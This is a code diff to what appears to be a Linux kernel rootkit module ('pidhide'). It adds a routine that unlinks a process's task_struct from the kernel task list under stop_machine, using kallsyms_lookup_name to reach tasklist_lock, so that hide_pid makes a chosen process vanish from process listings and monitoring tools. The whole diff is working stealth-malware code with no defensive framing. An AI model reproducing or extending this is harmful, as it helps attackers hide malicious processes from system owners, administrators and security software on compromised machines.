@@ -1,6 +1,20 @@
 #include <linux/slab.h>
 #include <linux/pid.h>
+#include <linux/sched.h>
+#include <linux/proc_fs.h>
+#include <linux/sched/task.h>
 
+#include <linux/stop_machine.h>
+
+#include <linux/fs.h>
+#include <linux/fdtable.h>
+#include <linux/slab.h>
+#include <linux/fs_struct.h>
+#include <linux/pid.h>
+#include <linux/delay.h>
+#include <linux/dirent.h>
+
+#include "common.h"
 #include "hook.h"
 #include "pidhide.h"
 
@@ -43,6 +57,23 @@ unhide_pids(void)
     }
 }
 
+int
+del_task_cpu_stopped(void *arg)
+{
+    struct task_struct *ts = (struct task_struct *)arg;
+
+    rwlock_t *rwlock = (rwlock_t *)kallsyms_lookup_name("tasklist_lock");
+
+    if (!ts || !ts->tasks.prev || !ts->tasks.next) {
+        return 0;
+    }
+
+    write_lock_irq(rwlock);
+    list_del(&ts->tasks);
+    write_unlock_irq(rwlock);
+
+    return 0;
+}
 
 void
 hide_pid(pid_t pid)
@@ -64,6 +95,17 @@ hide_pid(pid_t pid)
     }
 
     add_pid_to_list(hidden_pids_tail, pid);
+
+	struct pid* pid_struct;
+    pid_struct = find_get_pid(pid);
+
+	if(pid_struct == NULL)
+		return;
+
+    struct task_struct *ts;
+	ts = pid_task(pid_struct, PIDTYPE_PID);
+
+    stop_machine((cpu_stop_fn_t)del_task_cpu_stopped, (void *)ts, NULL);
 }
 
 void
